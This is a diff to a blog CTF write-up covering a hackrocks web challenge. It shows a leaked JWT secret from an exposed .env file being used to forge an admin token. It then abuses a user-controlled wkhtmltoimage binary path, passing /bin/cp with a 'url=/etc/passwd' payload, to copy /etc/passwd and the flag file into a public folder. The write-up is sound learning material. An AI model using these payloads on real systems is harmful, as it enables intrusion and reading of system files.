@@ -107,7 +107,7 @@ I converted the characters to hex before passing them through decoders.
 > 
 > In addition to the information of pcap, the attacker may have implemented a C2. 
 
-You have a pcap file  [link](https://github.com/eqqn/eqqn.github.io/blob/master/uploads/log.pcap) 
+You have a pcap file  [log.pcap](https://github.com/eqqn/eqqn.github.io/blob/master/uploads/log.pcap) 
 
 Looking at HTTP and TCP streams, it is is clear something was downloaded. Wireshark allows you to export HTTP objects (files) that are not encrypted, and we recover "*stashed.bin*". 
 
@@ -141,12 +141,12 @@ I put the challenge on hold. I used one of the hints and it was telling that I s
 >  Clue nº 1
 > All you need is basic to advance directory knocking to your web infrastructure like “/.git” (NO FUZZERS ALLOWED)
 
-The "NO FUZZERS" statement didn't get across to me and I wasted a time and CTF infra running scans trying to find some hidden directory.
+The "NO FUZZERS" statement didn't get across to me and I wasted time and CTF infra running scans trying to find some hidden file/directory.
 
 It is apparent that my enumeration methods are a bit dated and I need a better wordlist.
 
 I also tried some suspected python files but nothing sticked related to config, dependencies, routing. After some conversation with another player, it was clear I was very close.
-I retried with different ideas sometime later and found `http://challenges.hackrocks.com:9998/.env` file containing a secret JWT key.
+I retried with different ideas sometime later and found `http://challenges.hackrocks.com:9998/.env` file containing a secret JWT key in `.env` file.
 
 `JWT_KEY = S3crEt_t0K3n$$$$`  . I used it to change my JWT token cookie and sign it on jwt.io  I also incremented the validity time to last me for the rest of CTF :)
 
@@ -154,8 +154,88 @@ I retried with different ideas sometime later and found `http://challenges.hackr
 
 #### admin panel
 
-#### exploitation
+Review code and UI. Commments were part of the package provided.
 
+![Image](https://eqqn.github.io/images/scream_ui.png)
+
+```python
+@app.route("/admin", methods=['POST'])
+def checkadminapi():
+    data = request.form
+    uri, output = data.get('url'), data.get('output')
+    print(uri)
+    print(output)
+    #print(data.get('wkhtmltoimagepath'))
+    status_to_ret = ""
+    err_ret = ""
+    bool_hid=""
+    # RCE
+    if len(data.get('wkhtmltoimage')) > 2:
+        print("1")
+        param = data.get('wkhtmltoimage')
+        print(param)
+        try:
+            config = imgkit.config(wkhtmltoimage=param)
+            imgkit.from_url(uri, str('./static/'+output), config=config)
+        except Exception as e:
+            err_ret = str(e)
+            bool_hid = "true"
+            status_to_ret = ""
+        # RCE END
+```
+
+Using the panel to submit requests gave an error:
+
+```
+wkhtmltoimage exited with non-zero code -6. error:
+QXcbConnection: Could not connect to display 
+
+
+You need to install xvfb(sudo apt-get install xvfb, yum install xorg-x11-server-Xvfb, etc), then add option: {&#34;xvfb&#34;: &#34;&#34;}.
+```
+
+Lets dig into this. When it runs "correctly", there is another component downstream that is not installed and throws an error. 
+
+However if we look at [imgkit manual](https://pypi.org/project/imgkit/)(parent of wkhtmltoimage/pdf library), it is supposed to be configured as follows:
+
+```
+config = imgkit.config(wkhtmltoimage='/opt/bin/wkhtmltoimage', xvfb='/opt/bin/xvfb-run')
+imgkit.from_string(html_string, output_file, config=config)
+```
+
+The wkhtmltoimage parameter that we control should point to a binary. What if we pass it `/bin/bash`
+
+![Image](https://eqqn.github.io/images/scream_bb.JPG)
+
+![Image](https://eqqn.github.io/images/scream_bbetc.JPG)
+
+Bash tries to execute every line in a file, with these inputs and outputs the errors. Leaking part of the file, but crashes halfway due to brackets being present in the script. Why not try `/bin/cat` , `/bin/ls`? We only get response when the command fails, and we still don't know where the flag is. To make things more tricky, it is hard to use `url` parameter to make more advanced commands because some special characters are getting sanitized. We need a more reliable way to exfiltrate data.
+
+If we review the code, we see that `output` parameter will output the command output to "/static" folder with output as parameter. 
+
+```python
+imgkit.from_url(uri, str('./static/'+output), config=config)
+```
+
+I thought about using gzip/tar to compress the whole filesystem or part of it, and put it on the "/static" path, but because the parameters are not in the right order, we can't do it. 
+
+`url=/etc/passwd&output=eqqn_github_io_writeup&wkhtmltoimage=/bin/cp`
+
+Now the URL hxxp://challenges.hackrocks.com:9998/static/eqq_github_io_writeup should resolve, with the contents of /etc/passwd file.
+
+```
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+ctf:x:1000:1000::/home/ctf:/bin/bash
+```
+
+We see that there is a user ctf, so we dig into user bash history, .profile, and other files that could give us more information. The history points us to 
+
+`/home/ctf/flag.txt`
+
+> flag{pwn_jwt_4nd_blindly_pwn_the_ISSu3_81}
+
+Really liked this challenge, it was a good practice for greybox approach.
 
 ## ACE-ng, 55 points, medium
 
